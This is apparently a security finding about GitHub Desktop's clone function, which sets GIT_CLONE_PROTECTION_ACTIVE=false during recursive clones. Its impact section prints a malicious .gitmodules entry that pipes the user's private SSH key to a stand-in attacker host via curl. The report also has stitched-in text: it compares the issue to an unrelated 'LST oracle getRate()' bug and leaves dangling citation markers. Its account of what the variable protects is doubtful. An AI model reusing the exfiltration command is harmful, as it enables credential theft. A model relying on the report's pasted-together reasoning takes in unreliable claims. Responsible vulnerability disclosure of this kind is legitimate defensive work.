### Title
Recursive clone disables Git's submodule-protocol safeguard, allowing malicious repos to trigger local file read / command execution via `.gitmodules` - (File: `app/src/lib/git/clone.ts`)

### Summary
When GitHub Desktop clones a repository it always runs `git clone --recursive` and explicitly forces the environment variable `GIT_CLONE_PROTECTION_ACTIVE=false`. This variable is the mechanism Git itself introduced (following the historical `file://`/`ext::` submodule remote-code-execution class of bugs, e.g. CVE‑2022‑39253) to prevent a recursively-cloned repository's `.gitmodules` from pointing submodules at dangerous transports (`file://`, `ext::`) unless the user has explicitly opted in via `protocol.file.allow`/`protocol.ext.allow`. By hard-coding this flag to `'false'`, Desktop unconditionally disables that built-in Git protection for every clone it performs, trusting the untrusted `.gitmodules` content of any repository a user clones.

### Finding Description
`clone()` in [1](#0-0)  builds the environment for the `git clone --recursive` invocation:

```
const env = {
  ...(await envForRemoteOperation(url)),
  GIT_CLONE_PROTECTION_ACTIVE: 'false',
}
...
const args = [
  '-c',
  `init.defaultBranch=${defaultBranch}`,
  'clone',
  '--recursive',
]
``` [2](#0-1) 

`--recursive` means Git will automatically run `submodule update --init --recursive` as part of the clone, reading submodule remote URLs straight out of the cloned repository's `.gitmodules` file — content fully controlled by whoever authored the repository, i.e. attacker-controlled data, exactly analogous to the LST oracle's unchecked `getRate()` return value. Git normally guards this step: when it internally invokes the submodule helper during a protected recursive clone it sets `GIT_CLONE_PROTECTION_ACTIVE=true`, and the submodule/transport code refuses `file://` and `ext::` submodule URLs in that context unless the user has separately allow-listed those protocols. By setting the variable to `'false'` before spawning `git clone`, Desktop tells Git that no such protection is required, defeating the check before it can even run.

The same file also contains `isClonePathSensitive()` — a check for the *destination* path of the outer clone — but this offers no protection for the *submodule* URLs pulled from `.gitmodules`, which are a completely different, attacker-controlled data path. Desktop's submodule code in `app/src/lib/git/submodule.ts` separately gates `protocol.file.allow=always` behind an explicit `allowFileProtocol` flag for post-clone submodule updates [3](#0-2) , showing the team is aware file-protocol submodules need to be opt-in — yet the initial `clone()` call bypasses this awareness entirely by disabling Git's own equivalent safeguard for the very first, most common operation (cloning a new repo).

### Impact Explanation
Because a normal "Clone repository" action in Desktop is a security boundary — users routinely clone repositories from links, forks, or search results without inspecting `.gitmodules` first — an attacker who controls a repository (or a fork/PR they get a victim to clone) can add a submodule entry such as:
```
[submodule "x"]
  path = x
  url = ext::sh -c "curl attacker.com/$(cat ~/.ssh/id_rsa|base64) >/dev/null"
```
or a `file://` URL pointing at a sensitive local path, and have it fetched/executed automatically the moment the victim clones the repo in Desktop, without the app ever asking the user or applying Git's designed opt-in gate. Depending on the Git version bundled with Desktop this can translate into arbitrary command execution (`ext::`) or disclosure of local files outside the cloned repository (`file://`), both of which are explicitly in scope as valid outcomes (code execution / file read outside the repo, driven by an attacker-controlled cloned repository).

### Likelihood Explanation
This is triggered by the default, most common user action — cloning any repository through Desktop's UI ("Clone a repository from the Internet…") — using nothing but a crafted `.gitmodules` in the repository being cloned. No local access, admin rights, prior malware, or unusual user steps are required beyond the ordinary act of cloning an attacker-supplied repository URL, which is squarely within the accepted attacker model for this report.

### Recommendation
Do not force `GIT_CLONE_PROTECTION_ACTIVE=false`. Leave Git's protection active during `git clone --recursive` (or remove the override entirely) so the default protocol allow-list applies. If Desktop needs to support `file://`/`ext::` submodules for legitimate local-clone workflows, gate that behind the same explicit, user-confirmed `allowFileProtocol`-style mechanism already used in `app/src/lib/git/submodule.ts`, rather than disabling the protection unconditionally for every clone.

### Proof of Concept
1. Attacker creates a public repository containing a `.gitmodules` file with a submodule whose `url` uses `ext::` (or `file://` pointing at a sensitive path) and commits it.
2. Attacker shares the clone URL / a link that leads to "Clone repository" in Desktop with a victim.
3. Victim clones the repository normally through Desktop's UI.
4. `clone()` in `app/src/lib/git/clone.ts` runs `git -c init.defaultBranch=... clone --recursive -- <url> <path>` with `GIT_CLONE_PROTECTION_ACTIVE=false` in the environment.
5. Git's recursive submodule step reads the malicious `.gitmodules` and, because the protection variable indicates no restriction, fetches/executes the attacker-controlled `ext::`/`file://` submodule reference automatically — no prompt, no confirmation dialog, no user awareness of the submodule content.

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]
